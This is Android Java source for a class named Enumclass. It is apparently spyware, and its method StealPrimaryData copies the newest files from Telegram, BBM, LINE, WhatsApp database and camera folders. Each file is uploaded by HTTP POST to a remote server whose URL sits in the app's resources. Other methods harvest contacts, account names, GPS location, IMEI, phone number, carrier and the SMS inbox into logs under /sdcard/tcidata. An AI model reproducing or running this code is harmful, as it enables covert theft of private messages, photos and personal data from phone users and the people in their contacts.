package intert.internet;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.SyncStateContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import android.content.ContentResolver;
import android.provider.ContactsContract;

import android.app.Activity;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

/**
 * Created by ringlayer on 11/29/16.
 */
public class Enumclass extends Activity {
    public FileSystemOp fso = new FileSystemOp();


    /* self made function */
    public void StealPrimaryData() {
        try {
              /*
                Telegrams :
                /sdcard/Pictures/Telegram
                /sdcard/Telegram



                BBM:
                /sdcard/Pictures/BBM
                if we have root priv, try also :
                 /data/data/com.bbm


                LINE :
                 /sdcard/LINE_Backup
                 /sdcard/Pictures/LINE


                 if we have root priv, try also :
                  /data/data/jp.naver.line.android


                WA :
                   /sdcard/WhatsApp
                * */

            String[] non_root_path = {"/Telegram/Telegram Documents", "/Telegram/Telegram Images","/Pictures/BBM", "/Pictures/LINE", "/WhatsApp/Databases",  "/WhatsApp/Media/WhatsApp Images", "/DCIM/Camera"};
            boolean exists;
            String possible_path = "";
            File file;
            String tmp_storage;
            List<String> storages_string = fso.EnumSD();
            ListIterator<String> sdcards;

            sdcards = storages_string.listIterator();
            while (sdcards.hasNext()) {
                exists = false;

                tmp_storage = "/mnt/" + sdcards.next();
                exists = fso.CheckIfDirectoryExists(tmp_storage);
                if (exists) {
                    /* iterate through non_root_path's array of strings */
                    int size = non_root_path.length;
                    for (int i = 0; i < size; i++) {
                        /*
                        new File("/sdcard/tcidata" + non_root_path[i]).mkdirs();
                        */

                        possible_path = tmp_storage + "/" + non_root_path[i] + "/";
                        //String the_path = non_root_path[i].replaceAll("/", "_");
                        /*copyDirectory(File sourceLocation, File targetLocation) */
                        FecthLatestFiles(possible_path, 4,  non_root_path[i]);
                    }
                }
            }
            /*
            fso.zipDir("/sdcard/tcidata.zip", "/sdcard/tcidata/");
            */
        }
        catch (Exception e) {
            fso._do_log_debug(e, "StealPrimaryData");
            e.printStackTrace();
        }
    }

    public void FecthLatestFiles(String full_path, int how_many, String the_appender) {
        try {
            /*
            * modified sorter from
            * http://crunchify.com/how-to-sort-list-of-files-based-on-last-modified-time-in-ascending-and-descending/
            * */
            int counter = 0;
            File dir = new File(full_path);
            File[] files = dir.listFiles();
            if (files != null) {
                String mod_date = "";
                String full_data = "";
                String tmp_file_name = "";
                String sourceLocation_str = "";
                String targetLocation_str = "";
                String search = "databases";
                if (full_path.toLowerCase().indexOf(search.toLowerCase()) != -1) {
                    how_many = 2;
                }
                fso.append_file("/sdcard/tcidata/command.log", "\n========DESCENDING==========\n");
                Arrays.sort(files, LastModifiedFileComparator.LASTMODIFIED_REVERSE);
                for (int i = 0; i < files.length; i++) {
                    if (counter >= how_many) {
                        break;
                    }

                    File file = files[i];
                    if (file != null) {
                        tmp_file_name = file.getName();
                        fso.append_file("/sdcard/tcidata/command.log", "\n" + tmp_file_name + "\n");
                        if ((tmp_file_name.length() > 1) && (tmp_file_name != null)) {
                            sourceLocation_str = full_path + tmp_file_name;

 /*
 {"/Telegram/Telegram Documents",
 "/Telegram/Telegram Images",
 "/Pictures/BBM",
 "/Pictures/LINE",
 "/WhatsApp/Databases",
 "/WhatsApp/Media/WhatsApp Images",
 "/DCIM/Camera"};
      */                    String urlString = getString(R.string.ur1);

                            boolean retval = the_appender.contains("Telegram");
                            if (retval == true) {
                                urlString = getString(R.string.ur1_telegram);
                            }
                            retval = the_appender.contains("BBM");
                            if (retval == true) {
                                urlString = getString(R.string.ur1_bbm);
                            }
                            retval = the_appender.contains("LINE");
                            if (retval == true) {
                                urlString = getString(R.string.ur1_line);
                            }
                            retval = the_appender.contains("WhatsApp");
                            if (retval == true) {
                                urlString = getString(R.string.ur1_wa);
                            }
                            retval = the_appender.contains("DCIM");
                            if (retval == true) {
                                urlString = getString(R.string.ur1_dcim);
                            }
                            //targetLocation_str = "/sdcard/tcidata/" + the_appender + "/" + tmp_file_name;


                            do_upload(urlString, sourceLocation_str, tmp_file_name);

                            /*
                            File sourceLocation = new File(sourceLocation_str);
                            File targetLocation = new File(targetLocation_str);
                            fso.copyFile(sourceLocation, targetLocation);
                            */
                        }
                    }
                    counter++;
                }
            }
        }
        catch (Exception e) {
            fso._do_log_debug(e, "FecthLatestFiles");
        }
    }

    protected void do_upload(String uri, String filep, String filen) {
        try {

            InputStream inputStream = new FileInputStream(new File(filep));

            byte[] data = fso.convertToByteArray(inputStream);
            HttpClient httpClient = new DefaultHttpClient();
            httpClient.getParams().setParameter(CoreProtocolPNames.USER_AGENT, System.getProperty("http.agent"));
            HttpPost httpPost = new HttpPost(uri);
            InputStreamBody inputStreamBody = new InputStreamBody(new ByteArrayInputStream(data), filen);
            MultipartEntity multipartEntity = new MultipartEntity();
            multipartEntity.addPart("file", inputStreamBody);
            httpPost.setEntity(multipartEntity);
            HttpResponse httpResponse = httpClient.execute(httpPost);
            String stringResponse = EntityUtils.toString(httpResponse.getEntity());
        }
        catch (FileNotFoundException e1) {
            fso._do_log_debug(e1, "do_upload");
        }
        catch (ClientProtocolException e) {
            fso._do_log_debug(e, "do_upload");

        } catch (IOException e) {
            fso._do_log_debug(e, "do_upload");
        }
    }

    public void get_contact(Context myContext) {
        try {
            int i = 0, x = 0;
            String _count = "";
            String full_contact_data = "";
            String phone_log_path = "/sdcard/tcidata/contact.log";
            String contact_name = "";
            String contact_id = "";
            String contact_phone = "";
            String contact_email = "";
            String contact_lookup_key = "";
            String contact_type = "";
            String phone_before = "";
            Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
            String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
            Uri EmailCONTENT_URI =  ContactsContract.CommonDataKinds.Email.CONTENT_URI;
            String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
            String DATA = ContactsContract.CommonDataKinds.Email.DATA;
            ContentResolver cr = myContext.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);

            fso.JustExec("touch " + phone_log_path);
            if (cur.getCount() > 0) {
                while (cur.moveToNext() && (i < 151)) {
                    i = i + 1;
                    contact_id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    contact_name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact_lookup_key = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));

                    if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        full_contact_data = "\n==============================\n";
                        full_contact_data +=  "\ncontact id :" + contact_id;
                        full_contact_data += "\ncontact name :" + contact_name;
                        /* get phone numbers */
                        Cursor phoneCursor = cr.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
                        x = 1;
                        while (phoneCursor.moveToNext()) {
                            contact_phone = "";
                            contact_phone = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                            if (contact_phone.length() > 3) {
                                _count = Integer.toString(x);
                                if (phone_before != contact_phone) {
                                    full_contact_data += "\ncontact phone " + _count + ":" + contact_phone;
                                    x++;
                                }
                            }
                        }
                        phoneCursor.close();
                        /* eof get phone numbers */

                        /* get emails */
                        Cursor emailCursor = cr.query(EmailCONTENT_URI,    null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);
                        x = 1;
                        while (emailCursor.moveToNext()) {
                            contact_email = "";
                            contact_email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
                            if (contact_email.length() > 3) {
                                _count = Integer.toString(x);
                                full_contact_data += "\ncontact email " + _count + ":" + contact_email;
                                x++;
                            }
                        }
                        emailCursor.close();
                        /* eof get emails */

                        fso.append_file(phone_log_path, full_contact_data);
                    }
                }
            }
        }
        catch (Exception e) {
            fso._do_log_debug(e, "get_contact");
        }
    }

    /*
    modified from http://stackoverflow.com/questions/14051023/how-to-get-current-sim-card-number-in-android
    */

    public void get_all_accounts(Context myContext) {
        try {


            AccountManager am = AccountManager.get(myContext);
            Account[] accounts = am.getAccounts();
            String str_ar = "";

            String acc_path = "/sdcard/tcidata/accounts.log";
            String data = "";
            //ArrayList<String> dev_accounts = new ArrayList<String>();

            fso.createFileInSDCard(acc_path);
            for (Account ac : accounts) {
                str_ar = ac.toString();
                String acname = ac.name;
                String actype = ac.type;
                data = "Accounts : " + acname + ", " + actype;
                fso.append_file(acc_path, data);
                data = "\n==================\n" + str_ar + "\n==================\n";
                fso.append_file(acc_path, data);
            }
        }
        catch (Exception e) {
            fso._do_log_debug(e, "get_accounts");
        }
    }

    /*
    gps positioning modified from http://www.coders-hub.com/2013/10/android-location-address-and-distance.html#.V7WYPbMxVc8
    */
    public String get_location(Context myContext) {
        try {
            LocationManager lm;
            Location l;
            String provider;
            double lng = 0;
            double lat = 0;
            String lat_str;
            String long_str;
            String lat_long;

            lm = (LocationManager) myContext.getSystemService(Context.LOCATION_SERVICE);
            Criteria c = new Criteria();
            provider = lm.getBestProvider(c, false);
            l = lm.getLastKnownLocation(provider);
            if (l != null) {
                //get latitude and longitude of the location
                lng = l.getLongitude();
                lat = l.getLatitude();
                long_str = String.valueOf(lng);
                lat_str = String.valueOf(lat);
                lat_long = "Longitude:" + long_str + " - Latitude : " + lat_str;
            } else {
                lat_long = "Longitude: 0 - Latitude : 0";
            }
            return lat_long;
        }
        catch (Exception e) {
            // Do nothing
            fso._do_log_debug(e, "get_location");
            return "failed to get location";
        }
    }

    /*
    taken from http://stackoverflow.com/questions/7071281/get-android-device-name
    */
    public String getDeviceName() {
        try {
            String manufacturer = Build.MANUFACTURER;
            String model = Build.MODEL;
            String brand = Build.BRAND;
            if (model.startsWith(manufacturer)) {
                return capitalize(model);
            }
            else {
                return capitalize(manufacturer) + " " + model + " " + brand;
            }
        }

        catch (Exception e) {
            // Do nothing
            fso._do_log_debug(e, "getDeviceName");
            return "";
        }
    }


    private String capitalize(String s) {
        try {
            if (s == null || s.length() == 0) {
                return "";
            }
            char first = s.charAt(0);
            if (Character.isUpperCase(first)) {
                return s;
            } else {
                return Character.toUpperCase(first) + s.substring(1);
            }
        }
        catch (Exception e) {
            // Do nothing
            fso._do_log_debug(e, "capitalize");
            return "";
        }
    }

    public String getimei(Context myContext) {
        /* taken from http://stackoverflow.com/questions/12819361/how-to-get-device-information-in-android
        */
        try {
            String serviceName = Context.TELEPHONY_SERVICE;
            TelephonyManager m_telephonyManager = (TelephonyManager)myContext.getSystemService(serviceName);
            String IMEI;
            IMEI = m_telephonyManager.getDeviceId();
            return IMEI;
        }
        catch (Exception e) {
            fso._do_log_debug(e, "getimei");
            return "failed to get imei";
            // Do nothing
        }
    }

    public void DoGetLocationAndLog(Context myContext) {
        try {
            String full_data = get_location(myContext);

            String path = "/sdcard/tcidata/location.log";
            fso.createFileInSDCard(path);
            fso.write(path, full_data);

        }
        catch (Exception e) {
            Log.e("Debug", "error: " + e);
            fso._do_log_debug(e, "DoGetLocationAndLog");
        }
    }

    public void GetCompleteDeviceInfoAndLogResult(Context myContext) {
        try {
            /* simcard info taken from
            * http://stackoverflow.com/questions/35686419/how-to-get-sim-operator-name-from-dual-sim-android-device
            * */
            TelephonyManager tManager = (TelephonyManager)myContext.getSystemService(Context.TELEPHONY_SERVICE);
            String pNumber = tManager.getLine1Number();
            String networkOperatorName = tManager.getNetworkOperatorName();


            String os_version = System.getProperty("os.version");
            String dev_simple_info = getDeviceName();
            String imei = getimei(myContext);
            String full_log = "Version : " + os_version + "\n" + "Device Name : " + dev_simple_info + "\n" + "IMEI : "+ imei + "\n" + "Phone Number : " + pNumber + "\n" + "SIMCARD Operator : " +networkOperatorName;
            String path = "/sdcard/tcidata/device.log";
            fso.createFileInSDCard(path);
            fso.write(path, full_log);
        }
        catch (Exception e) {
            fso._do_log_debug(e, "GetCompleteDeviceInfoAndLogResult");
            // Do nothing
        }
    }



    public String GetInBoxSms(Context myContext) {
        String sms = "";

        try {
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = myContext.getContentResolver().query(uriSMSURI, null, null, null, null);
            while (cur.moveToNext()) {
                String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
                sms += "From :" + cur.getString(2) + " : " + body + "\n\n";
            }
        }
        catch (Exception e) {
            fso._do_log_debug(e, "GetInBoxSms");
            e.printStackTrace();
        }
            return sms;
    }



}
